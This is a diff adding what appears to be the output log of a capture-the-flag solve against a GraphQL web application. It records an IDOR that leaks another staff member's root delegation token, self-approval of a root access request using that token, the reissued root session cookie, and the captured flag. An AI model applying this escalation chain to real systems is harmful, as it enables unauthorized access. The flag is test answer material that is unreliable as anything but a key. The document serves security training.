@@ -1,0 +1,23 @@
+[1] register + login fresh account: pwnbot10
+    session cookie: eyJyb2xlIjoic3RhbmRhcmQiLCJ1c2VybmFtZSI6InB3bmJvdDEwIn0.asr8IA.sUihjuT66_GnQtqW86Q5IeI7xDQ
+[2] current role
+    {"data":{"me":{"role":"standard","username":"pwnbot10"}}}
+
+[3] IDOR: read another staff member's delegations via staff(id:1)
+    {"data":{"staff":{"delegations":[{"id":101,"owner":"k.mercer","tier":"root","token":"71f2706cbfdf445a"}],"id":1,"team":"platform","username":"k.mercer"}}}
+
+[4] create access request for tier=root
+    {"data":{"createAccessRequest":{"id":5003,"requester":"pwnbot10","status":"pending","tier":"root"}}}
+
+[5] approve own request using the leaked root delegation token as sponsor
+    HTTP 200 Set-Cookie: session=eyJyb2xlIjoicm9vdCIsInVzZXJuYW1lIjoicHduYm90MTAifQ.asr8Jg.HKrAjG_Jo3vkzvWsjS1hxm8VedY; HttpOnly; Path=/
+    {"data":{"approveRequest":{"id":5003,"status":"approved"}}}
+
+[6] role after approval (server re-issued session with role=root)
+    {"data":{"me":{"role":"root","username":"pwnbot10"}}}
+
+[7] read root vault
+    {"data":{"rootVault":"KPMG_CTF{QPv_XrGZAFxc8KmwCR8fh8jP6vP_nYpYhYLxvjL1PLFu}"}}
+
+
+FLAG: KPMG_CTF{QPv_XrGZAFxc8KmwCR8fh8jP6vP_nYpYhYLxvjL1PLFu}
